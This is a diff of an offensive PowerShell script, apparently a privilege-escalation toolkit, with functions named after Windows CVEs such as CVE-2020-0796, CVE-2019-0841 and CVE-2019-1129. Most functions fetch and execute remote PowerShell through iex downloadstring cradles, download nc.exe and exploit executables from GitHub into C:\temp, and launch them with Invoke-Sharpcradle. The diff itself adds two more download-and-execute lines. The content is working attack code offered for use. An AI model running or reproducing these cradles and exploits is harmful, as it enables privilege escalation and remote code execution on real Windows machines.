@@ -647,7 +647,7 @@ function testtemp
 function cve-2020-0796
 {
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2020-0683.ps1')
-    cve-2020-0796-lpe
+    cve-2020-0796
 }
 
 function printspoofer
@@ -738,6 +738,7 @@ function CVE-2018-8120
 function CVE-2019-0841
 {
     testtemp
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
     Invoke-Sharpcradle -uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/privesc.exe" -argument1 license.rtf
@@ -746,6 +747,7 @@ function CVE-2019-0841
 }
 function CVE-2019-1129
 {
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
     Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
 	Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
 	Start-Sleep -Seconds 15
